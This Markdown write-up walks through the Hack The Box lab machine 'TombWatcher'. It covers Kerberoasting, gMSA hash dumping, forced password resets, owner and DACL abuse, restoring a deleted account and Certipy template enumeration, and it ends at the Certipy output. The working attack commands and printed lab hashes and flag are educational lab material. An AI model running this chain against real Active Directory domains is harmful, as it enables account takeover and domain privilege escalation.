---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - ESC-15
  - Certipy
  - Pass-The-Certificate
  - Pass-The-Hash
  - Kerberoasting
  - Bloodhound
  - gMSA-Dumper
  - TargetedKerberoast
---
# Overview

| Name        | TombWatcher |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: `henry` / `H3nry_987TGV!`.
# Recon
## Nmap

```
❯ sudo nmap -sC -sV -A 10.10.11.72
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 01:20 +0545
Nmap scan report for 10.10.11.72
Host is up (0.31s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-07 23:35:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-07T23:37:14+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-09-07T23:37:14+00:00; +4h00m03s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-07T23:37:14+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-07T23:37:14+00:00; +4h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-09-07T23:36:37
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m02s, deviation: 0s, median: 4h00m02s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   312.67 ms 10.10.14.1
2   312.90 ms 10.10.11.72

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.45 seconds
```

```bash
❯ hostfile --linux 10.10.11.72 tombwatcher.htb
Added to /etc/hosts:
   10.10.11.72 tombwatcher.htb

❯ hostfile --linux 10.10.11.72 dc01.tombwatcher.htb
Added to /etc/hosts:
   10.10.11.72 dc01.tombwatcher.htb
```
# Enumeration
## Bloodhound

```bash
❯ bloodhound-python -u henry  -p 'H3nry_987TGV!'  -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 59S
INFO: Compressing output into 20250908012600_bloodhound.zip
```
# Exploitation
## Kerberoasting

See Object Outbound Control on Henry. It has `WriteSPN` in Alfred meaning Kerberoasting.

![[tombwatcher.png]]

Fixing clock skew:

```bash
❯ sudo timedatectl set-ntp off

❯ rdate -n 10.10.11.72
rdate: Could not set time of day: Operation not permitted

❯ sudo rdate -n 10.10.11.72
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Invalid cookie received, packet rejected
rdate: Too many bad or lost packets
rdate: Unable to get a reasonable time estimate

❯ sudo rdate -n 10.10.11.72
Mon Sep  8 06:14:56 +0545 2025
```
### TargetedKerberoast.py

```bash
❯ python targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$dce9eab92ec250be66f6eb0bcc00e240$4ba583f0d97b3ea5afc5326df04f12310af15ebd738a25f3f553083fc1c20016414b6b2e2daf950304a269c676b375c65bc01f592d1e630e0aad45259baa3d3c9336b1516bb327f82d98b1f79a19d8524614aa895c70d454ae464f9c83d1d8e81b62253163911dffd0f343093736cd33809b6b52a6abe451c9f61ed8002502ef5125191bf132eca03e5639191563edaf348be67085adef2ff236fdaa9277a1942d545d119954504207e6f263c64edef2519b194197053f3a14fef9268a77c36950849dc749417796310a2f82c202c026956af20c704ba23d4741270c74a8a93ab519612b01f59b671014f0ad9db19055a1a2b0285f9a256766b5c58c99ad6849beb12b6c1c4a2e44d212aacbbb222da8bd26b82c0dc2d86ac926d0b5ddb2f8e0914e10bde19f66b5b5d227ef9b27b93e8dfd08e7b6733ac355b6101b314b110bac1547571a9ccb46563f23c886a785294a14ebede46a0e666d27c326021322086202d6f6ece215c88a3cbc363c3901eda566df61cc5e33cc424fc86ea67b1d617357c213de4e971aeee495d113eb9c9c4863b5ec86ee653c2a2d9052da4e1be5dc8501f132cd2a2f69080b3ba789c78b6166042e2dba130a0bd3236f13ba8f87108050d0f767e9f7bf28b731770f5ffad1bd9c3b209e7b686acd82b557a69f56c4e1c4bfaa31d3d2ea89ada03d27d946bcbca08fce2a79d81e7b92972ed4f5e70a3c9cd7c7b211b66b220029f13849413b8c7d14b15498cfb8def0aa6e3bf4fcfba3aa033259972a98bb4d5223a6039b1fcf2538f1f3c48422bd0f82f26f1a4327c4f8ecf405d8460473c003aafbe58960da5a3beab71500e3cabbb9b365caa6e7cd494c885d527aafceb7f569a96a955e64e3c15e2135dabfe00083e4aabcbce51e67ce3fb9c2013f708c9f2c26322268203346fc6aa08a14e716aa1163e1c5c5f271433d9397a1f772ee1b9c5d219abb0e7c912ab954dca743b566c2df44396259d90a8fad20572f3f037c3bc0251c145a4ab8fe261d0fcefbde993b901ef4b1a50b896c9285f4a6948f2b0e7f871c384566a525da2fe5542cc677c0a7d86c0d2773459950f55cab5af9ea59340f76e452c0b8a68e1361cf38e9fb846027afea1145f1da37d64445af486f1bdca41b73b7b1897601f5b282a7ec01ffa72ed347d5fc9c08d6ecf7ca1387a803221aeefcc325201e138a76a6a9741b17edfdbbfba8c7568aeeb50b668840d03340ce779e7d4bc8de2a4cf9791ab9630d76ec245004dfb71d340a797d6b95f17700738e967bc7e35d11f38b82b8e9f77ae691a8d6df52a48411bf5642dd6e142a323fcba4b8b6712840a27b847b293a67c984638ab68d41fb31b0ad121102f630b4d4a7a110cb5f1eaf39beb17cdfb6ae4c223e5bb309343d6d4a39f422451e7118cf18a74fce9d5588e9d746fc62bfa30e0b8ee20144995c136513c81ac72656f71730cdd865b1b7
[VERBOSE] SPN removed successfully for (Alfred)
```
### John The Ripper

```bash
❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2025-06-08 12:33) 100.0g/s 204800p/s 204800c/s 204800C/s 123456..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
# Lateral Movement
## Bloodhound (Alfred)

```bash
❯ bloodhound-python -u alfred  -p 'basketball'  -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 01M 00S
INFO: Compressing output into 20250908061725_bloodhound.zip
```

![[tombwatcher2.png]]

```bash
❯ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred
[+] alfred added to INFRASTRUCTURE
```
## Bloodhound (Alfred Again)

```bash
❯ bloodhound-python -u alfred  -p 'basketball'  -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 59S
INFO: Compressing output into 20250908062909_bloodhound.zip
```
## gMSA Dump

Then perform Bloodhound collection again and find that `Ansible_dev$` can `ReadGMSAPassword` in the group. A **Group Managed Service Account (gMSA)** stores its password securely in AD.

![[tombwatcher4.png]]

We can dump gMSA. We can use [GMSADumper](https://github.com/micahvandeusen/gMSADumper) to dump hashes.

```bash
❯ git clone https://github.com/micahvandeusen/gMSADumper
Cloning into 'gMSADumper'...
remote: Enumerating objects: 54, done.
remote: Counting objects: 100% (54/54), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 54 (delta 22), reused 38 (delta 14), pack-reused 0 (from 0)
Receiving objects: 100% (54/54), 38.35 KiB | 135.00 KiB/s, done.
Resolving deltas: 100% (22/22), done.

❯ cd gMSADumper

❯ ls
__init__.py  COPYING  gMSADumper.py  README.md  requirements.txt

❯ python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::ecb4146b3f99e6bbf06ca896f504227c
ansible_dev$:aes256-cts-hmac-sha1-96:dae98d218c6a20033dd7e1c6bcf37cde9a7c04a41cfa4a89091bf4c487f2f39a
ansible_dev$:aes128-cts-hmac-sha1-96:0ec1712577c58adc29a193d53fc73bd4
```

We can use hash to enumerate.
## Bloodhound (Ansible_Dev)

```bash
❯ bloodhound-python -u 'ansible_dev$' -d tombwatcher.htb -ns 10.10.11.72 \
  --hashes aad3b435b51404eeaad3b435b51404ee:ecb4146b3f99e6bbf06ca896f504227c \
  -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
ERROR: Unhandled exception in computer DC01.tombwatcher.htb processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 986, in non_polling_read
    received = self._sock.recv(bytes_left)
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodhound/enumeration/computers.py", line 133, in process_computer
    unresolved = c.rpc_get_group_members(562, c.dcom)
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 795, in rpc_get_group_members
    raise e
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 756, in rpc_get_group_members
    resp = samr.hSamrOpenAlias(dce,
                               domainHandle,
                               desiredAccess=samr.ALIAS_LIST_MEMBERS | MAXIMUM_ALLOWED,
                               aliasId=group_rid)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/samr.py", line 2490, in hSamrOpenAlias
    return dce.request(request)
           ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 860, in request
    self.call(request.opnum, request, uuid)
    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 849, in call
    return self.send(DCERPC_RawCall(function, body.getData(), uuid))
           ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1306, in send
    self._transport_send(data)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1243, in _transport_send
    self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/transport.py", line 543, in send
    self.__smb_connection.writeFile(self.__tid, self.__handle, data)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 543, in writeFile
    return self._SMBConnection.writeFile(treeId, fileId, data, offset)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1742, in writeFile
    written = self.write(treeId, fileId, writeData, writeOffset, len(writeData))
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1444, in write
    ans = self.recvSMB(packetID)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 515, in recvSMB
    data = self._NetBIOSSession.recv_packet(self._timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 917, in recv_packet
    data = self.__read(timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 1004, in __read
    data = self.read_function(4, timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 988, in non_polling_read
    raise NetBIOSTimeout
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

INFO: Done in 00M 52S
INFO: Compressing output into 20250908063640_bloodhound.zip
```

This `aad3b435b51404eeaad3b435b51404ee` is just universal placeholder when the LM hash is missing and format is `--hashes LMHASH:NTHASH`.
## Change SAM Password

![[tombwatcher5.png]]

```bash
❯ bloodyAD -d tombwatcher.htb -u 'ansible_dev$' -p ':ecb4146b3f99e6bbf06ca896f504227c' --host 10.10.11.72 set password SAM 'Password@123'

[+] Password changed successfully!
```
## Bloodhound (SAM)

```bash
❯ bloodhound-python  -u 'SAM' -p 'Password@123' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 01M 00S
INFO: Compressing output into 20250908070219_bloodhound.zip
```

![[tombwatcher6.png]]

```bash
❯ impacket-owneredit -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'Password@123' -dc-ip 10.10.11.72
/home/at0m/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

We are `WriteOwner` so we can add `GenericAll` to change objects.

```bash
❯ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'Password@123' add genericAll john sam
[+] sam has now GenericAll on john
```

Now from this change the Password.

```bash
❯ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'Password@123' set password john 'Password@1234'
[+] Password changed successfully!
```

```bash
❯ evil-winrm -i 10.10.11.72 -u john -p 'Password@1234'

*Evil-WinRM* PS C:\Users\john\Documents> ls
*Evil-WinRM* PS C:\Users\john\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> ls


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         9/5/2025  10:02 AM             34 user.txt


*Evil-WinRM* PS C:\Users\john\Desktop> cat user.txt
99ad70e6714f6646423b7d05c0f4f33d
```
# Privilege Escalation

![[tombwatcher7.png]]
## Modifying DACL 

It has `GenericAll` so we can take `ADCS` child objects too that is DACL, So lets do it:

```bash
❯ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'Password@1234'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250908-071633.bak
[*] DACL modified successfully!
```
## Checking Deleted User/Object

```powershell
*Evil-WinRM* PS C:\Users\john\Desktop> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
CN                              : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
codePage                        : 0
countryCode                     : 0
Created                         : 11/15/2024 7:55:59 PM
createTimeStamp                 : 11/15/2024 7:55:59 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/15/2024 7:57:59 PM
modifyTimeStamp                 : 11/15/2024 7:57:59 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
<SNIP>
```
## Restoring `cert_admin`

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> Restore-ADObject -Identity "CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb"
```
## Bloodhound (John)

Now this time we should see `cert_admin` user also which we restored.

```bash
❯ bloodhound-python -u 'john' -p 'Password@1234' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 01M 00S
INFO: Compressing output into 20250908072506_bloodhound.zip
```

![[tombwatcher8.png]]
## Changing `cert_admin` Password

```
❯ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb'  -u 'john' -p 'Password@1234' set password cert_admin 'Password@123456'
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 86, in password
    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 281, in bloodymodify
    self.modify(self.dnResolver(target), changes, controls, encode=encode),
                ~~~~~~~~~~~~~~~^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 265, in dnResolver
    ).result()
      ~~~~~~^^
  File "/usr/lib/python3.13/concurrent/futures/_base.py", line 456, in result
    return self.__get_result()
           ~~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3.13/concurrent/futures/_base.py", line 401, in __get_result
    raise self._exception
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 259, in asyncDnResolver
    raise NoResultError(self.domainNC, ldap_filter)
bloodyAD.exceptions.NoResultError: [-] No object found in DC=tombwatcher,DC=htb with filter: (sAMAccountName=cert_admin)
```

Got error so, Let's do manually.

```powershell
*Evil-WinRM* PS C:\Users\john\Desktop> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Password@123456" -AsPlainText -Force)
Cannot find an object with identity: 'cert_admin' under: 'DC=tombwatcher,DC=htb'.
At line:1 char:1
+ Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (Conve ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (cert_admin:ADAccount) [Set-ADAccountPassword], ADIdentityNotFoundException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException,Microsoft.ActiveDirectory.Management.Commands.SetADAccountPassword
```

Weird it got deleted again even we restored it few steps before. Anyways let's try again.

```powershell
*Evil-WinRM* PS C:\Users\john\Desktop> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf



*Evil-WinRM* PS C:\Users\john\Desktop> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
*Evil-WinRM* PS C:\Users\john\Desktop> Enable-ADAccount -Identity cert_admin
*Evil-WinRM* PS C:\Users\john\Desktop> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Password@123456" -AsPlainText -Force)
```
## Certipy-Ad for Finding Exploitable Certs

```bash
❯ certipy-ad find -u cert_admin -p "Password@123456" -dc-ip 10.10.11.72 -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250908074453_Certipy.txt'
[*] Wrote text output to '20250908074453_Certipy.txt'
[*] Saving JSON output to '20250908074453_Certipy.json'
[*] Wrote JSON output to '20250908074453_Certipy.json'
```

```bash

❯ cat 20250908074453_Certipy.txt
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
